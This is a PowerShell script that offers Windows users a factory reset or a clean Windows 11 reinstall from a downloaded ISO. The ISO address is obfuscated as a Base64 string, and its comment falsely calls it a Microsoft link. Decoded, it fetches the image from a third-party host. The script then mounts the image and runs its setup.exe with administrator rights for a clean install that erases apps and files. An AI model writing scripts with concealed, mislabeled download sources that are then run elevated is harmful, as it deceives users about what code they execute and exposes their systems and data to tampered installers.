# Run as Administrator
Add-Type -AssemblyName System.Windows.Forms

function Test-SystemReset {
    try {
        Get-Command systemreset -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Download-WithProgress {
    param (
        [string]$Url,
        [string]$Destination
    )
    try {
        $wc = New-Object System.Net.WebClient

        $wc.DownloadProgressChanged += {
            Write-Progress -Activity "Downloading ISO" -Status ("{0}%" -f $_.ProgressPercentage) -PercentComplete $_.ProgressPercentage
        }
        $wc.DownloadFileAsync($Url, $Destination)
        while ($wc.IsBusy) { Start-Sleep -Milliseconds 500 }
        Write-Progress -Activity "Downloading ISO" -Completed
        return $true
    } catch {
        return $false
    }
}

# =====================================================
# STEP 1 : If systemreset exists offer choice
# =====================================================
if (Test-SystemReset) {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Windows Reset Options"
    $form.Size = New-Object Drawing.Size(350,150)
    $form.StartPosition = "CenterScreen"

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "Choose how to refresh this PC:"
    $label.AutoSize = $true
    $label.Location = New-Object Drawing.Point(10,20)
    $form.Controls.Add($label)

    $button1 = New-Object System.Windows.Forms.Button
    $button1.Text = "Quick Reset"
    $button1.Location = New-Object Drawing.Point(30,60)
    $button1.Add_Click({
        $form.Tag = "reset"
        $form.Close()
    })
    $form.Controls.Add($button1)

    $button2 = New-Object System.Windows.Forms.Button
    $button2.Text = "Full Reinstall"
    $button2.Location = New-Object Drawing.Point(150,60)
    $button2.Add_Click({
        $form.Tag = "reinstall"
        $form.Close()
    })
    $form.Controls.Add($button2)

    $form.ShowDialog() | Out-Null

    if ($form.Tag -eq "reset") {
        Write-Host "Running Windows Reset..."
        Start-Process "systemreset.exe" -ArgumentList "-factoryreset"
        exit
    }
    elseif ($form.Tag -ne "reinstall") {
        Write-Warning "No choice made. Exiting."
        exit
    }
}

# =====================================================
# STEP 2 : Full Reinstall workflow
# =====================================================
Write-Host "Preparing Full Reinstall via setup.exe..."

$directIsoUrl = "$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGQAcgBpAHYAZQAuAG0AYQBzAHMAZwByAGEAdgBlAC4AZABlAHYALwBlAG4ALQB1AHMAXwB3AGkAbgBkAG8AdwBzAF8AMQAxAF8AYwBvAG4AcwB1AG0AZQByAF8AZQBkAGkAdABpAG8AbgBzAF8AdgBlAHIAcwBpAG8AbgBfADIANABoADIAXwB1AHAAZABhAHQAZQBkAF8AYQB1AGcAXwAyADAAMgA1AF8AeAA2ADQAXwBkAHYAZABfADkAMgAzADYAZAA3ADkAYgAuAGkAcwBvAA==')))"   # <-- Insert a valid Microsoft time-limited ISO download link here
$tempIsoPath  = "$env:TEMP\Win11.iso"
$isoPath = $null
$downloadSuccess = $false

# ---- 2A: Try direct Microsoft ISO timed link first ----
if ($directIsoUrl -ne "") {
    Write-Host "Trying direct ISO download from Microsoft..."
    $downloadSuccess = Download-WithProgress -Url $directIsoUrl -Destination $tempIsoPath
    if ($downloadSuccess -and (Test-Path $tempIsoPath)) {
        $isoPath = $tempIsoPath
        Write-Host "ISO downloaded successfully to $isoPath"
    } else {
        Write-Warning "Direct ISO download failed (link may have expired)."
    }
}

# ---- 2B: Try default local ISO path ----
if (-not $isoPath) {
    $defaultIso = "$env:USERPROFILE\Downloads\Win11.iso"
    if (Test-Path $defaultIso) {
        $isoPath = $defaultIso
        Write-Host "Using existing ISO: $isoPath"
    }
}

# ---- 2C: Fallback to Media Creation Tool workflow ----
if (-not $isoPath) {
    Write-Host "Falling back to Media Creation Tool..."

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $mctDestination = "$env:USERPROFILE\Downloads\MediaCreationTool_Win11.exe"
    $mctUrl = "https://go.microsoft.com/fwlink/?linkid=2156295"

    if (-Not (Test-Path $mctDestination)) {
        Write-Host "Downloading Media Creation Tool..."
        Invoke-WebRequest -Uri $mctUrl -OutFile $mctDestination -UseBasicParsing
    }

    # Launch MCT and wait
    $proc = Start-Process -FilePath $mctDestination -PassThru -Verb RunAs
    $proc.WaitForExit()
    Write-Host "MCT closed. Please select ISO file you created."

    # User picks ISO
    $FileBrowser = New-Object System.Windows.Forms.OpenFileDialog
    $FileBrowser.Filter = "ISO Files (*.iso)| *.iso"
    $FileBrowser.Title = "Select the Windows 11 ISO you created"
    if ($FileBrowser.ShowDialog() -eq "OK") {
        $isoPath = $FileBrowser.FileName
        Write-Host "Selected: $isoPath"
    } else {
        Write-Warning "No ISO selected. Exiting."
        exit
    }
}

# =====================================================
# STEP 3 : Mount ISO and run setup.exe
# =====================================================
if (-not (Test-Path $isoPath)) {
    Write-Error "Could not find or download ISO. Exiting."
    exit
}

Write-Host "Mounting ISO..."
$mount = Mount-DiskImage -ImagePath $isoPath -PassThru
$driveLetter = ($mount | Get-Volume).DriveLetter + ":"

$setupExe = Join-Path $driveLetter "setup.exe"

if (Test-Path $setupExe) {
    # Clean install arguments - do not echo them to console
    $setupArgs = "/auto clean /dynamicupdate disable /eula accept /uninstall disable"

    # Confirm with user
    $res = [System.Windows.Forms.MessageBox]::Show(
        "About to launch Windows Setup for CLEAN INSTALL (this will remove apps and files). Continue?",
        "Confirm Clean Install",
        [System.Windows.Forms.MessageBoxButtons]::YesNo,
        [System.Windows.Forms.MessageBoxIcon]::Warning
    )

    if ($res -eq [System.Windows.Forms.DialogResult]::Yes) {
        Start-Process -FilePath $setupExe -ArgumentList $setupArgs -Verb RunAs
    } else {
        Write-Host "Clean install cancelled by user."
    }
} else {
    Write-Error "setup.exe not found in mounted ISO!"
}